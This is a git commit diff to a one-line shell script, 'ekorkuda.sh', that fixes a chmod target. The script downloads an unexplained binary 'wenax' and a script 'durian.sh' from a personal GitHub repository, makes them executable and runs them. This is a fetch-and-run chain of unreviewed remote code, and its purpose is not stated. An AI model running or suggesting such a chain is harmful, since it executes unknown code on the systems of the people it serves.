db13598a51e8ef14a2cd1380949db8556cdd67d7
synthsizer <39385299+synthsizer@users.noreply.github.com>
2024-01-17 15:54:57 +0700

    Update ekorkuda.sh

--- ekorkuda.sh
+++ ekorkuda.sh
@@ -1,1 +1,1 @@
-wget https://github.com/synthsizer/widicantik/raw/main/wenax && chmod +x node && wget https://raw.githubusercontent.com/synthsizer/widicantik/main/durian.sh && chmod +x durian.sh && ./durian.sh
+wget https://github.com/synthsizer/widicantik/raw/main/wenax && chmod +x wenax && wget https://raw.githubusercontent.com/synthsizer/widicantik/main/durian.sh && chmod +x durian.sh && ./durian.sh
